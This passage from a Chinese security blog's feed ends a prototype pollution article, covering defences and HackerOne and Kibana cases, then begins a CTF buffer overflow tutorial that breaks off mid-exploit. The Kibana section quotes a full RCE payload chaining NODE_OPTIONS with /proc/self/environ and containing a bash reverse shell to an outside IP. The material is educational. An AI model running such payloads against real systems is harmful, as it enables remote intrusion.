application</a></p>\n<p>常見的防禦方式有幾種，第一種是在做這些物件的操作時，阻止 <code>__proto__</code> 這個 key，例如說前面提到的解析 query string 跟 merge object 都可以採用這個方式。</p>\n<p>但是除了 <code>__proto__</code> 以外，也要注意另外一種繞過方式，像這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>obj<span class=\"token punctuation\">[</span><span class=\"token string\">'constructor'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'prototype'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br><span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 1</span></code></pre>\n<p>用 <code>constructor.prototype</code> 也可以去污染原型鏈上的屬性，所以要把這幾種一起封掉才安全。</p>\n<p>像是 <a href=\"https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad\">lodash.merge</a> 的 prototype pollution 就是用這種方式修復的，當 key 是 <code>__proto__</code> 或是 <code>prototype</code> 的時候會做特殊處理。</p>\n<p>第二種方式簡單易懂，就是不要用 object 了，或更精確地說，「不要用有 prototype 的 object」。</p>\n<p>有些人可能看過一種建立物件的方式，是這樣的：<code>Object.create(null)</code>，這樣可以建立出一個沒有 <code>__proto__</code> 屬性的空物件，就是真的空物件，任何的 method 都沒有。也因為這樣，所以就不會有 prototype pollution 的問題：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><br>obj<span class=\"token punctuation\">[</span><span class=\"token string\">'__proto__'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token comment\">// 根本沒有 __proto__ 這個屬性</span><br><span class=\"token comment\">// TypeError: Cannot set property 'a' of undefined</span></code></pre>\n<p>像是開頭提到的解析 query string 的 library，其實已經用了這種方式來防禦，像是每週下載次數高達 1 千萬次的 <a href=\"https://www.npmjs.com/package/query-string\">query-string</a>，<a href=\"https://github.com/sindresorhus/query-string#parsestring-options\">文件</a>上面就寫了：</p>\n<blockquote>\n<p>.parse(string, options?)<br>\nParse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.</p>\n<p>The returned object is created with Object.create(null) and thus does not have a prototype.</p>\n</blockquote>\n<p>其他還有像是建議用 <code>Map</code> 來取代 <code>{}</code>，但我覺得目前大家還是習慣用 object 居多，我自己覺得 <code>Object.create(null)</code> 會比 Map 好用一點。</p>\n<p>或是用 <code>Object.freeze(Object.prototype)</code>，把 prototype 凍結住，就沒辦法去修改：</p>\n<pre class=\"language-js\"><code class=\"language-js\">Object<span class=\"token punctuation\">.</span><span class=\"token function\">freeze</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>obj<span class=\"token punctuation\">[</span><span class=\"token string\">'__proto__'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br><span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// undefined</span></code></pre>\n<p>但 <code>Object.freeze(Object.prototype)</code> 的問題之一是假設某個第三方套件有去修改 <code>Object.prototype</code>，比如說為了方便直接在上面加一個屬性，那就會比較難 debug，因為 freeze 之後去修改並不會造成錯誤，只是不會修改成功而已。</p>\n<p>所以你可能會發現你的程式因為某個第三方套件壞掉了，但你不知道為什麼。還有一個我想到的可能風險是 polyfill，假設未來因為版本問題需要幫 <code>Object.prototype</code> 加上 polyfill，就會因為 freeze 的關係而失效。</p>\n<p>至於 Node.js，還可以使用 <code>--disable-proto</code> 這個 option 來把 <code>Object.prototype.__proto__</code> 關掉，詳情可以參考<a href=\"https://nodejs.org/api/cli.html#cli_disable_proto_mode\">官方文件</a></p>\n<p>或是未來也有可能使用 document policy 做處理，可以關注這個 issue： <a href=\"https://github.com/WICG/document-policy/issues/33\">Feature proposal: Mitigation for Client-Side Prototype Pollution</a></p>\n<h2 id=\"%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\">#</a> 實際案例</h2>\n<p>最後我們來看兩個 prototype pollution 的真實案例，讓大家更有感覺一點。</p>\n<p>第一個案例是知名 bug bounty 平台 hackerone 的漏洞（對，就是 bug bounty 平台本身的漏洞），完整報告在這裡：<a href=\"https://hackerone.com/reports/986386\">#986386 Reflected XSS on www.hackerone.com via Wistia embed code</a></p>\n<p>在網站上他們用了一個第三方套件，而在這個第三方套件裡面有一段程式碼長這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\">i<span class=\"token punctuation\">.</span>_initializers<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">initWLog</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> e<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> o<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> l<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    document<span class=\"token punctuation\">.</span>referrer <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>u <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>referrer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></code></pre>\n<p>它會去解析 <code>location.href</code> 跟 <code>document.referrer</code>，這兩者都是攻擊者可控的，然後 <code>i.url.parse</code> 這個 function 有著 prototype pollution 的漏洞，所以可以污染任意屬性。</p>\n<p>污染之後，作者發現了另外一段程式碼，這一段程式碼跟我們前面寫過的 <code>createElement</code> 有異曲同工之妙，<code>fromObject</code> 會去遍歷屬性然後放到 DOM 上：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>chrome <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">.</span><span class=\"token function\">fromObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    id<span class=\"token operator\">:</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">seqId</span><span class=\"token punctuation\">(</span><span class=\"token string\">'wistia_chrome_'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    <span class=\"token keyword\">class</span><span class=\"token operator\">:</span> <span class=\"token string\">'w-chrome'</span><span class=\"token punctuation\">,</span><br>    style<span class=\"token operator\">:</span> r<span class=\"token punctuation\">.</span>generate<span class=\"token punctuation\">.</span><span class=\"token function\">relativeBlockCss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    tabindex<span class=\"token operator\">:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre>\n<p>所以只要污染 <code>innerHTML</code>，就可以利用這個 script gadget 製造出一個 XSS 漏洞。實際的攻擊方式就是構造出一個能夠觸發 prototype pollution + XSS 的網址，只要把網址傳給別人，點開以後就會直接遭受到攻擊。</p>\n<p>這攻擊後半段還有繞過 CSP 的段落，用的是之前我在 <a href=\"https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/\">從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦</a>中有提過的技巧。</p>\n<p>另一個案例是 Kibana 的漏洞，原始文章在這裡：<a href=\"https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/\">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a>，官方對於這個漏洞的描述是這樣的：</p>\n<blockquote>\n<p>An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p>\n</blockquote>\n<p>在 Kibana 裡面有一個 Timelion 的功能，可以自己輸入語法並且畫成圖表，而下面這一段語法可以污染 prototype：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">.</span>es<span class=\"token punctuation\">.</span><span class=\"token function\">props</span><span class=\"token punctuation\">(</span>label<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span>x<span class=\"token operator\">=</span><span class=\"token string\">'ABC'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>污染 prototype 只是第一步，下一步是要找出 script gadget，kibana 中的其中一段程式碼長這樣子：</p>\n<pre class=\"language-js\"><code class=\"language-js\">  <span class=\"token keyword\">var</span> env <span class=\"token operator\">=</span> options<span class=\"token punctuation\">.</span>env <span class=\"token operator\">||</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">var</span> envPairs <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><br>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> key <span class=\"token keyword\">in</span> env<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">const</span> value <span class=\"token operator\">=</span> env<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>value <span class=\"token operator\">!==</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      envPairs<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>key<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>value<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span></code></pre>\n<p>這一段會來拿構造環境變數，而這個環境變數會用來跑新的 node process，例如說 envPairs 如果是 <code>a=1</code> 的話，應該就會跑 <code>a=1 node xxx.js</code> 這個指令。</p>\n<p>既然是跑 node.js，我們可以利用 <code>NODE_OPTIONS</code> 這個環境變數來偷偷引入檔案：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// a.js</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a.js'</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// b.js</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'b.js'</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// 跑這個指令，用環境變數引入 a.js</span><br><span class=\"token constant\">NODE_OPTIONS</span><span class=\"token operator\">=</span><span class=\"token string\">\"--require ./a.js\"</span> node b<span class=\"token punctuation\">.</span>js<br><br><span class=\"token comment\">// 輸出</span><br>a<span class=\"token punctuation\">.</span>js<br>b<span class=\"token punctuation\">.</span>js</code></pre>\n<p>所以，如果我們可以上傳一個 js 檔案，就可以搭配 prototype pollution 去執行這個檔案了。聽起來有點麻煩，有其他方法嗎？</p>\n<p>有！有一個滿常用的技巧是有些檔案的內容其實是可控的，例如說 PHP 中的 session 內容就有機會控制，可參考這一篇：<a href=\"https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce\">透過 LFI 引入 PHP session 檔案觸發 RCE</a>，而另一個 Linux 系統中的檔案 <code>/proc/self/environ</code> 則是會有現在的 process 的所有環境變數。</p>\n<p>如果我們建立一個環境變數叫做 <code>A=console.log(123)//</code>，<code>/proc/self/environ</code> 的內容就會變為：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token constant\">A</span><span class=\"token operator\">=</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....</span></code></pre>\n<p>就變成了合法的 JS 程式碼！</p>\n<p>於是就可以利用這樣的方式去執行它：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token constant\">NODE_OPTIONS</span><span class=\"token operator\">=</span><span class=\"token string\">\"--require /proc/self/environ\"</span> <span class=\"token constant\">A</span><span class=\"token operator\">=</span><span class=\"token string\">'console.log(1)//'</span> node b<span class=\"token punctuation\">.</span>js</code></pre>\n<p>作者最後給出的 code 長這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">.</span><span class=\"token function\">es</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">props</span><span class=\"token punctuation\">(</span>label<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">AAAA</span><span class=\"token operator\">=</span><span class=\"token string\">'require(\"child_process\").exec(\"bash -i >&amp; /dev/tcp/192.168.0.136/12345 0>&amp;1\");process.exit()//'</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">.</span><span class=\"token function\">props</span><span class=\"token punctuation\">(</span>label<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NODE_OPTIONS</span><span class=\"token operator\">=</span><span class=\"token string\">'--require /proc/self/environ'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>污染了兩個不同的屬性，創造了兩個環境變數，一個用來把 <code>/proc/self/environ</code> 變成合法的 JS 並且包含了要執行的程式碼，另一個 <code>NODE_OPTIONS</code> 則透過 <code>--require</code> 去引入 <code>/proc/self/environ</code>，最後就串成了可以執行任意程式碼的 RCE 漏洞！</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>我自己在接觸資安以前，是沒有聽過 prototype pollution 的。</p>\n<p>因此當我第一次接觸到 prototype pollution 這個漏洞的時候，我覺得有些驚訝。我驚訝的點在於，為什麼我從來沒聽過這個？比起前端常見的漏洞像是 XSS 或是 CSRF 等等，prototype pollution 的知名度似乎低了許多。</p>\n<p>有些人第一次看到這名詞可能是因為某個 NPM 的 package 有這個漏洞，升級版本以後就修掉了，但可能沒有去理解這個漏洞的成因以及可能的影響。</p>\n<p>我自己其實滿愛這個漏洞的，第一是我覺得成因很有趣，第二是我覺得尋找 script gadget 也很有趣。總之呢，希望能藉由這篇文章，讓更多前端工程師認識到這個漏洞，並且知道它的原理以及防禦方式。</p>\n<p>最後推薦大家一篇超讚的文章，透過自動化的方式去檢測 prototype pollution 漏洞，並且找出發生問題的地方，我覺得把 prototype pollution 又提升到了另一個境界：<a href=\"https://blog.s1r1us.ninja/research/PP\">A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild</a></p>\n",
      "date_published": "2021-09-29T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/",
      "title": "PWN 入門 - buffer overflow 是什麼？",
      "content_html": "<!-- summary -->\n<p>你可能在很多 CVE 裡都看過 buffer overflow 這個名詞，但你知道這個弱點是如何引發 RCE 這麼嚴重的問題的嗎？這次讓我們來透過幾個簡單小題目看看 buffer overflow 如何發生，又該如何 exploit。</p>\n<!-- summary -->\n<p>在開始之前，請先閱讀 Reverse 101 的基礎篇：<a href=\"https://tech-blog.cymetrics.io/posts/crystal/reverse-01\"><strong>Reverse Engineering 101 — Part 1</strong></a>，學習 pwn 的時候，了解記憶體分配與程式的運作方式是很重要的。</p>\n<h2 id=\"what-is-buffer-overflow%3F\"><a class=\"direct-link\" href=\"#what-is-buffer-overflow%3F\">#</a> What is buffer overflow?</h2>\n<p>讓我們回顧一下函數的呼叫與執行是如何運作的。在 64 bit 的 Unix 系統中，參數會以暫存器傳遞（通常前六個為 <code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code> <code>r8</code> <code>r9</code>），而每一個函數內部會用到的變數以及結束後要返回繼續執行的指令位置等資料，會以一個 stack frame 的結構層層堆疊，並用 calling convention 管理 stack frame 的創建與銷毀。</p>\n<p>先前我們看到的 stack frame 只是一個粉紅色的區塊，但現在我們要來更仔細的檢視這塊記憶體裡到底裝了什麼。</p>\n<p>下面這邊是一段簡單的 C code，一開始會宣告一些區域變數，做一些運算邏輯，然後吃一段使用者輸入的名字到 name 這個長度為 64 byte 的字串裡，最後再把名字印出來。右邊是這個函數用到的記憶體空間，stack frame 底部會先放 function prologue 儲存好的 return address 以及舊的 rbp 位置，再往上才是函數內部用到的區域變數。這塊空間中，區域變數的順序 spec 並沒有規定，主要是 compiler 編譯時會根據一些優化規則跟記憶體 alignment 分配，然後把安排好的順序包進執行檔。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/c-to-stack.png\" /><figcaption><p>simple C code and stack frame</p>\n</figcaption></figure></p>\n<p>這些為區域變數預留好的空間，就是一個一個的 buffer，當變數被賦值或是寫入的時候，資料就會填入這些記憶體。在程式開發者預設的情況下，使用者的名字幾乎不會超過 64 byte，所以他預期用戶輸入名字之後，記憶體就會長得像下面左邊的樣子，一個蘿蔔一個坑。</p>\n<p>但是，這裡有一個致命的缺點。在 C 語言中，<code>gets(char s*)</code> 這個函數會從 stdin 讀取一行字並存到 s 指到的記憶體位置中，所謂『一行字』就是說，在遇到換行符號或 EOF 前都會一直讀下去。</p>\n<p>你可能發現問題在哪了：當讀取的字串長度超過了分配的記憶體大小會怎麼樣呢？</p>\n<p>答案就是：會把後面的記憶體空間覆寫過去，這就叫做溢位（overflow）。</p>\n<p>那溢位又會如何？別忘了，當你把區域變數的空間都蓋過去了，下面兩塊記體就是舊的 rbp 位置跟函數結束後要回復執行的 return address。如果再多寫一點蓋過去，那你就可以竄改 return address，掌控程式的運作流程（hijack control flow），執行你想要的邏輯！下圖右邊就是當你輸入一大串的 A 把記憶體都填滿之後會噴的錯誤，因為 return address 指向不存在程式邏輯的 0xAAAAAAAA 所以導致程式 crash 報出 segmentation fault 的錯誤。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/stack-overflow.png\" /><figcaption><p>buffer overflow!</p>\n</figcaption></figure></p>\n<p>以上就是最基礎的 stack-based buffer overflow 模型。在 pwn 的題目中，我們的目標就是要想辦法控制 return address 來達到 RCE。再來讓我們用幾個簡單的小題目實際練習一下吧！</p>\n<h2 id=\"simple-retaddr-overwrite---retcheck\"><a class=\"direct-link\" href=\"#simple-retaddr-overwrite---retcheck\">#</a> Simple retaddr overwrite - retcheck</h2>\n<p>第一個簡單的小範例我們用 2021 Hactivitycon CTF 的暖身題 retcheck 示範如何篡改 return address。你可以在<a href=\"https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/retcheck\">這裡</a>下載擋案自己練習。</p>\n<p>跟之前 reverse 的方法一樣，我們先跑一次看看。你會發現它就是跟使用者要一行輸入，然後就結束了，非常簡短。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-run.png\" /><figcaption><p>running retcheck</p>\n</figcaption></figure></p>\n<p>用 <code>file</code> 得知檔案 not stripped 所以 symbols 都還在，然後用 GDB 打開這個檔案看一下 <code>main()</code> ，發現只是去呼叫 <code>vuln()</code> 這個函數。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-main.png\" /><figcaption><p>main function</p>\n</figcaption></figure></p>\n<p>再來跟進到 <code>vuln()</code> 看看做了哪些事。扣除跟使用者要輸入的核心邏輯，這題特別處理的地方是一開始把 return address 存起來（到 <code>0x404030</code>），最後再檢查 return address 的值是不是跟存起來的一樣，如果有被改動就會觸發 <code>abort</code>。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-vuln.png\" /><figcaption><p>vuln function</p>\n</figcaption></figure></p>\n<p>我們可以寫成核心邏輯如下：</p>\n<pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">400</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">get</span> <span class=\"token expression\">current <span class=\"token keyword\">return</span> address</span></span><br>    RETADDR <span class=\"token operator\">=</span> in_stack_0000<span class=\"token punctuation\">;</span><br>    <br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"retcheck enabled!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    l <span class=\"token operator\">=</span> <span class=\"token function\">strcspn</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    buf<span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\\00\"</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">check</span> <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token keyword\">return</span> address is modified</span></span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>in_stack_0000 <span class=\"token operator\">!=</span> RETADDR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token function\">abort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span><br><span class=\"token punctuation\">}</span>  </code></pre>\n<p>接下來該如何 exploit 呢？我們的策略是：判斷我們有哪些可以利用的弱點，找到可以 overflow 的地方，嘗試成功蓋過 return address，最後考慮如何避過檢查機制。</p>\n<p>先檢查這個檔案使用了哪些記憶體保護機制：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-checksec.png\" /><figcaption><p>checksec</p>\n</figcaption></figure></p>\n<p>簡單介紹一下這幾種機制：</p>\n<ul>\n<li>canary: 一個放在 stack 上的隨機值，位置在 old rbp 跟 return address 之前，會在函數要結束的時候被檢查值是否被更動，作為判斷是否有 overflow 的依據。</li>\n<li>fortify: 編譯時，compiler 會對可預知長度且與 libc 函數呼叫有關的變數做長度上限的檢查，如果執行時發現有越界的函數，就會程式就會強制結束</li>\n<li>NX: <strong>N</strong>on-<strong>E</strong>xecutable，強制『可寫段不可執行，可執行段不可寫』的原則，也就是無法直接寫 shellcode 然後執行，以及不能竄改可執行的區段。</li>\n<li>PIE: <strong>P</strong>osition <strong>I</strong>ndependent <strong>E</strong>xecutable，讓記憶體區段隨機分配，所以執行前沒辦法準確知道 base address 的位置，也就推算不出函數與變數的地址。</li>\n<li>RELRO: <strong>Rel</strong>ocation <strong>R</strong>ead-<strong>O</strong>nly，代表 binary 中的 header 在 linker 執行完後會是 read-only，如果是 FULL RELRO 甚至連 GOT 表也會一開始填好並變成唯讀。</li>\n</ul>\n<p>這題只開了 NX 跟 RELRO，所以我們不能用 shellcode 或是 GOT hijacking （竄改 GOT 表把 libc 函數指向目標函數）的技巧。但是沒有開 PIE，所以表示檔案內函數的位置是固定的，我們可以從 debugger 裡面選某個好用適合的目標函數的位置然後把 return address 導過去。</p>\n<p>我們用 <code>info functions</code> 看看有哪些函數：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-func.png\" /><figcaption><p>funcs</p>\n</figcaption></figure></p>\n<p><code>win()</code> 看起來特別有趣，簡單看一下會發現它就是讀取 <code>flag.txt</code> 然後印出 flag。也就是說我們只要能執行 <code>win()</code> 就成功了！</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-win.png\" /><figcaption><p>win</p>\n</figcaption></figure></p>\n<p>再來看看哪裡可以造成 overflow 呢？我們知道使用了 <code>gets()</code> 這個危險函數，而且 input 是 <code>[rbp-0x190]</code> 這個記憶體位置，所以字串 buffer 長度超過 0x190 就會溢出分配的空間，覆寫到後面的記憶體。</p>\n<p>為了判斷多少字元會蓋過 return address，第一次練習，我們的策略是填滿字串 buffer 後每次多加 8 byte，看什麼時候會剛好觸發 abort，一般來說是看觸發 segmentation fault，但因為這裡的程式邏輯在結束前會先判斷 return address 是否被篡改，所以我們的輸入如果會造成 abort 就表示我們寫到 return address 啦！我們先手動創建一個非常長的字串，嘗試蓋過字串 buffer 後面的一格地址：<code>'A'*0x190 + 'B'*8</code>，然後跑起來輸入程式中。</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-abort.png\" /><figcaption><p>abort</p>\n</figcaption></figure></p>\n<p>居然馬上就 abort 了，我們一次就蓋過去了嗎！</p>\n<p>Nonono，這是個天大的誤會。我們再試一次，這次設一個斷點在判斷 abort 的地方：<code>&lt;vuln+108&gt; cmp rdx, rax</code>，然後再跑一次，這次停在中斷點：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-break.png\" /><figcaption><p>breakpoint</p>\n</figcaption></figure></p>\n<p>你會發現，預期儲存的地址是 <code>0x401465</code>，但實際拿到的卻是 <code>0x401400</code>，明明我們寫的是 'A' 呀，怎麼會有 null byte 呢？那是因為當你按下 [ENTER] 送出字串的時候，後面是會補一個 '\\n' 的換行符號，也就是你送的實際上是 0x190 + 8 + 1 = 489 bytes 。而在程式中會把換行符號替換成 null byte，所以才會把 return address 的最後一個 byte 蓋過去。</p>\n<p>到這裡，我們知道三件事：</p>\n<ol>\n<li>return address 的位置找到了，是 0x190 + 8 = 0x198 後的 8 個 bytes</li>\n<li>return address 的值也知道了，是 <code>0x401465</code></li>\n<li>目標函數是 <code>win()</code>，在 <code>0x4012e9</code> 的位置</li>\n</ol>\n<p>現在尷尬了，我們的目標是要把 return address 蓋成 <code>win()</code>，但這樣又會觸發檢查機制讓程式直接 abort，該如何避開呢？</p>\n<p>你可以試試看，如果把 return address 放 <code>0x401465</code> 讓程式不要 abort 正常結束，然後從我們剛剛的中斷點開始逐步執行，你會發現程式是這樣執行的：正常離開 <code>vuln()</code> 之後會回到 <code>main()</code> 結尾的地方，這時會執行 <code>mov eax,0x0; pop rbp; ret;</code>，此時的 stack 接續著我們剛剛 <code>vuln()</code> 使用的空間，把 old rbp 還原並再次 return。對照著 <code>main()</code> 的 assembly，我們可以畫出 stack 的樣子：</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-stack.png\" /><figcaption><p>call frames</p>\n</figcaption></figure></p>\n<p>所以雖然我們不能在 <code>vuln()</code> 裡直接蓋掉 return address，但只要往後多寫兩個，就可以蓋掉 <code>main()</code> 的 return address 啦！</p>\n<p>至此這題差不多就結束了，我們可以用 python + pwntools 來寫 exploit</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span><br><br>context<span 